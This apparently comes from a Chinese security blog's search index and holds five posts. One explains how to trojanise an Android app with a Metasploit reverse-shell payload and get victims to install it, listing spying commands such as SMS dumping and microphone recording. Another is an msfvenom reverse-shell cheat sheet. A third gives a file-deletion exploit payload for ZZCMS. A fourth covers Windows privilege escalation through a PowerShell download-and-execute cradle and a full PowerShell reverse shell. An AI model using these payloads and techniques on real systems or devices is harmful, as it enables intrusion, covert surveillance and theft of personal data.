<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>手动给Android应用注入Payload</title>
      <link href="/2019/02/25/%E6%89%8B%E5%8A%A8%E7%BB%99Android%E5%BA%94%E7%94%A8%E6%B3%A8%E5%85%A5Payload/"/>
      <url>/2019/02/25/%E6%89%8B%E5%8A%A8%E7%BB%99Android%E5%BA%94%E7%94%A8%E6%B3%A8%E5%85%A5Payload/</url>
      
        <content type="html"><![CDATA[<p>###如何给Android应用写入木马</p><p>#####文章中介绍的工具、技术带有一定的攻击性，仅供安全研究，请合理合法使用。</p><p>#####本文原创作者：XXX，本文属i春秋原创奖励计划，未经许可禁止转载！</p><p>####需要用到的工具：<br>    逆向工具：Android killer<br>    木马工具：Metasploit<br>5G时代的来临，让移动安全受到更大的热潮，而我刚好蹭下热点。现在大多数的安卓应用都可以轻易的使用一些反汇编软件能够轻松的对安卓应用进行植入木马病毒和恶意Payload。</p><p>####第一步：使用Metasploit生成需要的Payload<br><code>msf5 &gt; msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.1 LPORT=4444 -o shell.apk</code><br><code>[*] exec: msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.10.1 LPORT=4444 -o shell.apk</code><br><code>[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload</code><br><code>[-] No arch selected, selecting arch: dalvik from the payload</code><br><code>No encoder or badchars specified, outputting raw payload</code><br><code>Payload size: 10090 bytes</code><br><code>Saved as: shell.apk</code></p><p>####第二步：反编译Android应用</p><p>#####使用反编译软件打开Android应用，我使用的是Android killer软件，其实在kali里面自带反编译软件的。<br><img src="https://p1.ssl.qhimg.com/t01a9f88e716f654bf2.png" alt=""></p><p>####第三步：寻找Android应用的入口文件和添加启动代码<br><img src="https://p0.ssl.qhimg.com/t01581fab3e300071cd.png" alt=""><br><img src="https://p5.ssl.qhimg.com/t017796c310b832d4af.png" alt=""><br>然后在onCreate函数里面添加Payload的启动文件<br><code>invoke-static {p0}, Lcom/metasploit/stage/Payload;-&gt;start(Landroid/content/Context;)V</code><br><img src="https://p0.ssl.qhimg.com/t01bb2e6785debf3c6d.png" alt=""></p><p>####第四步：添加Payload文件</p><p>#####使用反编译软件打开shell.apk，然后找到Metasploit文件<br><img src="https://p2.ssl.qhimg.com/t018cd8e7dc779f30a8.png" alt=""></p><p>#####然后把shell.apk下的Metasploit文件复制到需要植入Payload的apk里面的smali文件下的com的里面就可以了。<br><img src="https://p3.ssl.qhimg.com/t01c4c5c193b70fddf7.png" alt=""></p><p>####第五步：给Apk增加权限</p><p>#####打开shell.apk里面的AndroidManifest.xml，然后复制到需要植入Payload的apk里面的AndroidManifest.xml，需要注意的是权限的申请是唯一的，不能重复，不然可能会出现错误。<br><img src="https://p5.ssl.qhimg.com/t013a27e27ceca6b79e.png" alt=""></p><p>#####第六步：编译<br><img src="https://p3.ssl.qhimg.com/t015840998c58d4f624.png" alt=""></p><p>#####第七步：在Msf连接Payload<br><code>msf5 &gt; use exploit/multi/handler</code><br><code>msf5 exploit(multi/handler) &gt; set payload android/meterpreter/reverse_tcp</code><br><code>msf5 exploit(multi/handler) &gt; set LHOST 192.168.232.128</code><br><code>msf5 exploit(multi/handler) &gt; set LPORT 1111</code><br><code>msf5 exploit(multi/handler) &gt; exploit</code></p><p>#####第八步：利用社会工程学或者网马等技术让目标下载安装该APK，目标安装了该APK后我们就可以对目标的手机进行操作了。</p><p>######以下是Metasploit的一些Android Payload的命令<br>    webcam_list  列出网络摄像头<br>    record_mic [ˈrekərd]/记录/  从默认麦克风录制音频为X秒<br>    webcam_chat  开始视频聊天<br>    webcam_snap  从指定的摄像头获取快照<br>    webcam_stream -i 1  从指定的网络摄像头播放视频流[选择后摄像头]<br>    activity_start  从URI字符串启动Android活动<br>    check_root  检查设备是否有根<br>    dump_calllog  获取调用日志<br>    dump_contacts  获取联系人列表<br>    dump_sms  获取短信<br>    geolocate  利用地理定位获取当前LAT<br>    wlan_geolocate  利用WLAN信息获取当前LAT<br>    hide_app_icon  从发射器隐藏应用程序图标<br>    interval_collect  管理区间收集能力<br>    send_sms  从目标会话发送短消息<br>    set_audio_mode<br>    sqlite_query  从存储库查询SQLite数据库<br>    wakelock  启用/禁用Wakelock</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Metasploit常用的Payload</title>
      <link href="/2019/02/24/Metasploit%E5%B8%B8%E7%94%A8%E7%9A%84Payload/"/>
      <url>/2019/02/24/Metasploit%E5%B8%B8%E7%94%A8%E7%9A%84Payload/</url>
      
        <content type="html"><![CDATA[<p>#####Metasploit最有用的能力之一就是msfpayload模块。使用msfpayload模块基本可以生成市场上各种系统、语言的payloads。</p><p>######列出有效payloads<br><code>msfvenom -l</code></p><p>######Linux<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</code></p><p>######Windows<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</code></p><p>######Mac<br><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</code></p><p>######Android<br><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -o shell.apk</code></p><p>######PHP<br><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.phpcat shell.php | pbcopy &amp;&amp; echo &#39;&lt;?php &#39; | tr -d &#39;\n&#39; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</code></p><p>######ASP<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</code></p><p>######JSP<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</code></p><p>######WAR<br><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</code></p><p>######Python<br><code>msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</code></p><p>######Bash<br><code>msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</code></p><p>######Perl<br><code>msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</code></p><p>######Linux Shellcode<br><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p>######Windows Shellcode<br><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p>######MAC Shellcode<br><code>msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f &lt;language&gt;</code></p><p>连接Payloads:<br><code>use exploit/multi/handler</code><br><code>set payload linux/x86/meterpreter/bind_tcp</code><br><code>set RHOST 192.168.10.1</code><br><code>set LPORT 4444</code><br><code>exploit</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZZCMS任意删除漏洞“(CVE-2019-8411)</title>
      <link href="/2019/02/19/ZZCMS%E4%BB%BB%E6%84%8F%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E2%80%9C-CVE-2019-8411/"/>
      <url>/2019/02/19/ZZCMS%E4%BB%BB%E6%84%8F%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E2%80%9C-CVE-2019-8411/</url>
      
        <content type="html"><![CDATA[<h2 id="zzcms-任意删除文件漏洞-CVE-2019-8411-分析"><a href="#zzcms-任意删除文件漏洞-CVE-2019-8411-分析" class="headerlink" title="zzcms 任意删除文件漏洞(CVE-2019-8411) 分析"></a>zzcms 任意删除文件漏洞(CVE-2019-8411) 分析</h2><h3 id="Payload：action-del＆filename-1-php"><a href="#Payload：action-del＆filename-1-php" class="headerlink" title="Payload：action = del＆filename = .. / 1.php"></a>Payload：action = del＆filename = .. / 1.php</h3><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="这个漏洞产生的很大原因是开发者没有按照正确的安全开发，对敏感操作没有进行认证。"><a href="#这个漏洞产生的很大原因是开发者没有按照正确的安全开发，对敏感操作没有进行认证。" class="headerlink" title="这个漏洞产生的很大原因是开发者没有按照正确的安全开发，对敏感操作没有进行认证。"></a>这个漏洞产生的很大原因是开发者没有按照正确的安全开发，对敏感操作没有进行认证。</h4><h5 id="打开admin-dl-data-php，发现只要把del赋值action参数，然后添加需要删除的文件，就可以删除了，没有进行任何的认证。"><a href="#打开admin-dl-data-php，发现只要把del赋值action参数，然后添加需要删除的文件，就可以删除了，没有进行任何的认证。" class="headerlink" title="打开admin/dl_data.php，发现只要把del赋值action参数，然后添加需要删除的文件，就可以删除了，没有进行任何的认证。"></a>打开admin/dl_data.php，发现只要把del赋值action参数，然后添加需要删除的文件，就可以删除了，没有进行任何的认证。</h5><p><img src="https://p3.ssl.qhimg.com/t01c727f1967ca7eba9.png" alt="![](https://p1.ssl.qhimg.com/t01bf0deb989f4d9684.png)"></p><h5 id="从下面的图片可以看出，只要action参数等于’del’时，就能进随意的删除了，无需什么认证这个操作是极其危险。"><a href="#从下面的图片可以看出，只要action参数等于’del’时，就能进随意的删除了，无需什么认证这个操作是极其危险。" class="headerlink" title="从下面的图片可以看出，只要action参数等于’del’时，就能进随意的删除了，无需什么认证这个操作是极其危险。"></a>从下面的图片可以看出，只要action参数等于’del’时，就能进随意的删除了，无需什么认证这个操作是极其危险。</h5><p><img src="https://p2.ssl.qhimg.com/t016f20f810d9885d7c.png" alt=""><br><img src="https://p3.ssl.qhimg.com/t01d7111a5d2d627cd6.png" alt=""></p><h5 id="进行简单的添加认证后，这个Payload-就失效了，当然这个认证只是我个人的随意添加的，更多细节需要开发者团队自己增加。"><a href="#进行简单的添加认证后，这个Payload-就失效了，当然这个认证只是我个人的随意添加的，更多细节需要开发者团队自己增加。" class="headerlink" title="进行简单的添加认证后，这个Payload 就失效了，当然这个认证只是我个人的随意添加的，更多细节需要开发者团队自己增加。"></a>进行简单的添加认证后，这个Payload 就失效了，当然这个认证只是我个人的随意添加的，更多细节需要开发者团队自己增加。</h5><p><img src="https://p4.ssl.qhimg.com/t0199eed13579d71097.png" alt=""><br><img src="https://p5.ssl.qhimg.com/t0176f7639cdf27d15b.png" alt=""></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>我们真的懂什么是黑客吗？</title>
      <link href="/2019/02/19/%E6%88%91%E4%BB%AC%E7%9C%9F%E7%9A%84%E6%87%82%E4%BB%80%E4%B9%88%E6%98%AF%E9%BB%91%E5%AE%A2%E5%90%97%EF%BC%9F/"/>
      <url>/2019/02/19/%E6%88%91%E4%BB%AC%E7%9C%9F%E7%9A%84%E6%87%82%E4%BB%80%E4%B9%88%E6%98%AF%E9%BB%91%E5%AE%A2%E5%90%97%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="黑客是什么？"><a href="#黑客是什么？" class="headerlink" title="黑客是什么？ "></a><center>黑客是什么？ </center></h2><p>&emsp;&emsp; 黑客是什么？是映像中坐在电脑面前快速疯狂的敲几下键盘，就能黑了一台又一台的主机，甚至像出入自家院子一样随意的进入深网（有时“深网”这一术语被错误地用于指代暗网，其实不然前者指的是存在于黑暗网络、覆盖网络上的万维网内容，只能用特殊软件、特殊授权、或对计算机做特殊设置才能访问。暗网构成了深网的一小部分，深网网络没有被网络搜索引擎索引，后者指的是搜索引擎未索引（不能搜索到）的万维网内容）。<br><br>&emsp;&emsp;黑客</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>windows渗透之powershell提权</title>
      <link href="/2019/02/18/windows%E6%B8%97%E9%80%8F%E4%B9%8Bpowershell%E6%8F%90%E6%9D%83/"/>
      <url>/2019/02/18/windows%E6%B8%97%E9%80%8F%E4%B9%8Bpowershell%E6%8F%90%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<p></p><h3>windows渗透之powershell提权</h3><p></p><p></p><h5>攻击机:10.10.14.158</h5><p></p><p></p><h5>服务器:10.10.10.98</h5><br>今天朋友给了个只有telnet权限的账号让我帮忙提权，我进去发现服务器禁止了.exe程序执行，只能执行部分系统指令，发现powershell可能唯一突破口，但同样对运行权限做了一定的限制。常用的Set-ExecutionPolicy Unrestricted限制熬过等指令都需要管理员权限。提权的关键在于Runas命令，其中runas带有 /savecred参数，能够以保存的用户凭据执行命令。<br>这时候我就想到通过ps1文件来远程服务器，方便以后上传下载文件。<br>一、使用msfvenom生成PS1文件：<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt;  -f psh-reflection &gt;shell.ps1</code><br>二、开启Msf监听：<br><code>msf &gt; use exploit/multi/handler</code><br><code>msf exploit(handler) &gt; set payload</code><br><code>windows/x64/meterpreter/reverse_tcp</code><br><code>payload =&gt; windows/meterpreter/reverse_tcp</code><br><code>msf exploit(handler) &gt; set lhost 10.10.14.158</code><br><code>lhost =&gt; 10.10.14.158</code><br><code>msf exploit(handler) &gt; set lport 4444</code><br><code>lport =&gt; 4444</code><br><code>msf &gt; run</code><br>三、在攻击机开启http服务器：<br><code>python -m SimpleHTTPServer 8000</code><br>四、在目标机器执行cmd命令：<br><code>powershell -windowstyle hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://10.10.14.158:8000/shell.ps1&#39;);xx.ps1&quot;</code><br>五、上传GetRoot.ps1脚本<br><code>$client = New-Object System.Net.Sockets.TCPClient(&quot;10.10.14.158&quot;,6666);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + &quot;PS &quot; + (pwd).Path + &quot;&gt; &quot;;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()</code><br>六、使用GetRoot.ps脚本提权。<br>脚本上传完成后，打开nc监听攻击机子的6666端口<br>然后在服务器上执行命令<code>runas /user:administrator /savecred &quot;powershell -ExecutionPolicy ByPass -File C:\Users\Public\new.ps1&quot;</code><br>这时候nc监听的窗口会自动转服务器的Adminsistrator账号。<p></p>]]></content>
      
      
      
        <tags>
            
            <tag> windows提权 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
